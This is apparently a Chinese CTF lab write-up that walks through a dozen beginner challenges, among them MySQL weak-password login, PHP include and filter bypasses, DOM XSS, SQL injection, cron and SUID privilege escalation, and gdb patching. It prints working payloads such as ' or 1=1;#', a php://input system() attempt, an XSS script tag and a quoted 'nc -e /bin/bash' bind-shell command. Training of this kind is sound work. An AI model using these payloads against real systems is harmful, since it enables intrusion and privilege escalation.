# 弱密码

> 弱口令没有严格和准确的定义，通常认为容易被别人猜测到或被破解工具破解的口令均为弱 口令。弱密码漏洞，即由于 MySQL 数据库 root 账户的密码设置简单，为弱密码，很容易爆 破成功。
>
> MySQL 数据库的登录密码是典型的弱密码，并且有远程登录的权限，攻击者可以通过 sqlmap 等工具破解出弱密码，登录数据库并且获取数据库当中的随机 flag。
>
> tips：注意 sqlru 库

根据拓扑图，操作机地址为 1.1.170.2，靶机地址为 1.1.170.3。

试着连接 mysql：

```shell
$ mysql -h 1.1.100.3 -u root -p
```

提示输入密码。这里我们猜测 `123456`，结果是对的。

```mysql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sqlr               |
| sqlru              |
+--------------------+
5 rows in set (0.00 sec)

mysql> use sqlru;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------+
| Tables_in_sqlru |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | test     | 1647669370 |
+----+----------+------------+
1 row in set (0.00 sec)
```

得到了 flag。

# robots 协议

> robots 是网站跟爬虫间的协议，用简单直接的 txt 格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt 是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在 robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。
>
> 这道题很简单，主要考查对 robots 协议的理解。如果你真的理解了 robots 协议，那么你就可以轻松的找到 flag。

根据拓扑图，操作机地址为 1.1.174.2，靶机地址为 1.1.174.3。

直接访问 [1.1.174.3/robots.txt](1.1.174.3/robots.txt)，可以看到

```robots
User-agent: *
Disallow: 
Disallow: /admin/
Disallow: /admin/key.php
```

访问 [1.1.174.3/admin/key.php](1.1.174.3/admin/key.php)，得到 flag。

# 前端绕过

> 只需要把 10 位的密码输到长度限制为 9 位的输入框内，然后就可以得到 flag！

<kbd>F12</kbd>，看到

```html
<input name="password" maxlength="9" value="" type="text">
```

直接改为

```html
<input name="password" maxlength="10" value="" type="text">
```

# php 代码审计

> 是真的会 sleep 这么久，所以不考虑考虑其他输入时间的姿势嘛？强制转换和 is_numeric() 相比有哪些不足呢？

看到如下代码

```php
<?php
show_source(__FILE__);
if(isset($_GET['time'])){ 
    if(!is_numeric($_GET['time'])){ 
        echo 'The time must be number.'; 
    }else if($_GET['time'] < 60 * 60 * 24 * 30 * 2){ 
        echo 'This time is too short.'; 
    }else if($_GET['time'] > 60 * 60 * 24 * 30 * 3){ 
        echo 'This time is too long.'; 
    }else{ 
        sleep((int)$_GET['time']);
        if (isset($_GET['file'])) {
            include $_GET['file'];
        }
    } 
    echo '<hr>'; 
}
?> 
```

代码要求以 GET 方法传入 time，使得 time 大于 5184000，小于 7776000，然后 sleep 相应的时间。

强制转换（`(int)$_GET['time']`）遇到字母就停止。所以我们可以直接使用科学计数法的 `6e6`，既可以满足前面的大小比较，转换后又只剩下了 6。

接下来我们要找到 flag 在哪里，这里需要利用 `include` 相关的漏洞。我尝试使用 `/?time=6e6&file=php://input` 去 POST `<?php system("ls"); ?>`，但没有反应，显然相关的都被 ban 了。所以只能去猜 flag 在哪个位置。最后在 `/?time=6e6&file=/flag` 找到了。

# 利用计划任务获取 flag

> 在操作机中通过 ssh 连接靶机，账号 test、密码 123，进行后续的操作。
>
> 靶机环境中配置了一个仅有 root 运行权限的定时脚本 writable.sh，脚本功能分析代码可得。
>
> 与此同时，靶机环境中 /root 文件下配置了一个可执行文件 getflag，即 /root/getflag，用以获取 flag。
>
> 请分析并利用该定时任务，获取 flag。

首先连接 SSH

```bash
$ ssh test@1.6.54.3
```

输入密码即可登录。

```bash
$ ls
test  writable.sh
$ cat writable.sh
#!/bin/sh
for i in /home/test/test/*; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

`ulimit -t` 设置了 CPU 使用时间的上限，单位为秒。`bash -x` 为调试模式，会打印每条命令的执行情况。`rm -f` 删除文件。

它会定时执行 `/home/test/test` 中的文件，因此我们只需要把要运行的程序放在这个文件夹中，然后等它自动执行即可。

```bash
$ cd /home/test/test
$ echo "/root/getflag > /tmp/flag" > run
$ cd /tmp
$ cat flag
```

# dom 型 xss 攻击

> 浏览器进入靶机 IP 地址首页，根据网页提示找出 flag！
>
> 提示，根据此漏洞可以得到 ssh 登录的用户名，密码也是和用户名相关的弱密码

访问网站，可以在源代码里看到 js

```javascript
function log(){
    alert('admin * /home/admin   /bin/bash');
}
if (document.location.href.indexOf("default=") >= 0) {
    var lang = document.location.href.substring(document.location.href.indexOf("default=")+1);
    document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
    document.write("<option value='' disabled='disabled'>----</option>");
}
document.write("<option value='PHP'>PHP</option>");
document.write("<option value='Javascript'>Javascript</option>");
document.write("<option value='HTML'>HTML</option>");
document.write("<option value='Shell'>Shell</option>");
```

事实上 log 那里已经告诉了我们所需要的信息。但这显然是出题者的锅，我们**假装没看见**，访问

`/?default=<script>log();</script>`

就可以实现 XSS 注入，得到登录的用户名。

```bash
ssh admin@1.6.59.3
```

密码为 `admin`

```bash
$ ls
flag.txt
$ cat flag.txt
```

# 审计过滤

> 浏览器进入靶机 IP 地址首页，并借助 `靶机IP/Source.txt` 所提供的首页源码，尝试构造合适的 number 过滤掉所有的限制条件，找到 flag！

看到代码

```php
<?php
$info = "";
$req = [];
$flag='xxxxx';

ini_set("display_error", false);
error_reporting(0);
if(!isset($_GET['number'])){
    header("hint:26966dc52e85af40f59b4fe73d8c323a.txt");
    die("have a fun!!");
}

foreach([$_GET, $_POST] as $global_var) {
    foreach($global_var as $key => $value) {
        $value = trim($value);
        is_string($value) && $req[$key] = addslashes($value);
    }
}

function is_palindrome_number($number) {
    $number = strval($number);
    $i = 0;
    $j = strlen($number) - 1;
    while($i < $j) {
        if($number[$i] !== $number[$j]) {
            return false;
        }
        $i++;
        $j--;
    }
    return true; 
 }

if(is_numeric($_REQUEST['number'])) {
    $info="sorry, you cann't input a number!";
    echo  $info;
}
elseif($req['number']!=strval(intval($req['number']))) {
    $info = "number must be equal to it's integer!! ";  
    echo  $info;
}
else {
    $value1 = intval($req["number"]);
    $value2 = intval(strrev($req["number"]));
    if($value1!=$value2) {
        $info="no, this is not a palindrome number!";
        echo  $info;
    }
    else {
        if(is_palindrome_number($req["number"])) {
            $info = "nice! {$value1} is a palindrome number!";
            echo  $info;
        }
        else {
            $info=$flag;
            echo "Your flag is: ".$info;
        }
    }
}
?>
```

分析后可以构造出 `?number=%00%0C12321`

# 简单的 SQL 注入

> 尝试一次简单的 SQL 注入，flag 就藏在表里！

我们试着输入用户名 admin，密码 123456，然后看到：

```
query: select * from user_tab where user='admin' and pw='123456' 
```

直接注入

```
' or 1=1;#
```

看到

```
query: select * from user_tab where user='' or 1=1;#' and pw=''
Logged in!
your username is: admin
your password is: fsaoaigubbwouibiaewrawe 
```

所以直接注入

```
flag';#
```

# 寻找特权程序

> 靶机配置了 ssh，可以账号 test、密码 123 通过 ssh 登录到靶机进行攻击。（靶机 IP 地址见题目中网络拓扑图）
>
> 在 Linux 系统中文件的权限是很重要的一部分，通常的权限由读、写、执行三位组成，对每个文件都指定了文件所有者、同用户组的权限和其它非本用户组的权限。同时 Linux 中还有特殊的 suid、sgid 权限。设置了 suid / sgid 权限的文件，任何用户在执行该文件时，都将拥有文件属主/属组账号对应的权限。
>
> 在靶机环境中，设置有一个属于 root 用户，同时设置了 suid 权限的文件，只需要找到它并执行即可获取 flag。

首先连接到 SSH：

```shell
$ ssh test@1.9.50.3
```

然后查找文件：

```shell
$ find / -perm /u=s 2>/dev/null
/bin/mount
/bin/ping
/bin/ping6
/bin/su
/bin/umount
/etc/super
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/sudo
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
```

显然，`/etc/super`不是常规的 suid 文件。

最后得到 flag：

```shell
$ /etc/super
```

# nc 黑客指令

> 靶机配置了 ssh，可以账号 test、密码 123 通过 ssh 登录到靶机。
>
> 在 Linux 中，`nc -l -p portnum -e /bin/bash` 这条指令相当于开放一个端口，当外部连接这个端口的时候，返回 shell，相当于具有了 root 权限。
>
> 我们已经通过以上指令开放了一个 root 权限的端口，接下来就需要你找到这个端口，尝试连接它并依据其返回的shell找到对应的 flag。
>
> 建议从大端口开始尝试，flag 在 `/root/flag.txt` 中。

首先连接到 SSH：

```shell
$ ssh test@1.9.96.3
```

查看开放的端口：

```shell
$ netstat -a
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.11:46207        0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:36571           0.0.0.0:*               LISTEN     
tcp        0      0 d1e242c3d0c6:49922      172.16.22.214:6379      TIME_WAIT  
tcp        0      0 d1e242c3d0c6:ssh        1.9.96.2:37360          ESTABLISHED
tcp6       0      0 [::]:6379               [::]:*                  LISTEN     
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN     
udp        0      0 127.0.0.11:57692        0.0.0.0:*                          
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  3      [ ]         STREAM     CONNECTED     356762544 
unix  3      [ ]         STREAM     CONNECTED     356762543
```

连接：

```shell
$ nc 1.9.96.3 36571
$ cat /root/flag.txt
```

# ssh免密登录

> 通过操作机终端使用 ssh 登录靶机的 test 用户（密码 123），test 用户目录中存放了可用于 ssh 免密码登录靶机的 flag 用户所必要的文件，使用这些文件登录靶机的 flag 用户，flag 存在于 flag 用户目录中。



# gdb工具使用

> 靶机配置了 ssh，可以账号 test、密码 123 通过 ssh 登录到靶机。
>
> 靶机中存在两个用户：test 和 flag，分析 `getflag_main.c`，使用 gdb 工具获取用户 flag 的 passwd

先看看程序：

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <string.h>
#include <fcntl.h>

#define FAKEUID 1000

int main(int argc, char **argv, char **envp)
{
  int c;
  int fd;
  char token[18]="good_luck_for_you!";
  char passwd[8]="xiaoxiao";

  if(getuid() != FAKEUID) {
    printf("Security failure detected. UID %d started us, we expect %d\n", getuid(), FAKEUID);
    printf("The system administrators will be notified of this violation\n");
    exit(EXIT_FAILURE);
  }
  // snip, sorry :)
  printf("flag's passwd is: \n");
  for(i=0;i<8;i++){
    printf("%c",passwd[i]);
  }
}
```

然后使用 gdb 调试：

```shell
$ gdb -q getflag
(gdb) r
Starting program: /home/test/getflag 
Security failure detected. UID 1001 started us, we expect 1000
The system administrators will be notified of this violation
[Inferior 1 (process 101) exited with code 01]
(gdb) disassemble main
Dump of assembler code for function main:
   ...
   0x000055555555481c <+82>:	callq  0x555555554680 <getuid@plt>
   0x0000555555554821 <+87>:	cmp    $0x3e8,%eax
   0x0000555555554826 <+92>:	je     0x55555555485b <main+145>
   0x0000555555554828 <+94>:	callq  0x555555554680 <getuid@plt>
   ...
End of assembler dump.
(gdb) b *0x0000555555554821
Breakpoint 1 at 0x555555554821
(gdb) r
Starting program: /home/test/getflag 
Breakpoint 1, 0x0000555555554821 in main ()
(gdb) p $eax
$1 = 1001
(gdb) set $eax = 1000
(gdb) c
Continuing.
flag's passwd is: 
!o_o_cld[Inferior 1 (process 105) exited normally]
(gdb) q
```

之后登录即可：

```shell
$ su flag
$ cat ~/falg.txt
```

